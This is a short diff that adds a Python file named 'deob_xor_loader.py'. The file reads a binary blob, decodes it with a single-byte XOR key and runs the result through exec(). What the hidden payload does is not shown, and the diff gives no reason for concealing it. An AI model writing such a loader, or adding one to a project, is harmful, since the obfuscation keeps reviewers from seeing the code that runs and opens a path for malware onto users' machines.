@@ -1,0 +1,5 @@
+# deob_xor_loader.py
+with open("core/loaders/xor_loader.bin", "rb") as f:
+    obf = f.read()
+deobf = bytes(b ^ 77 for b in obf)
+exec(deobf.decode())
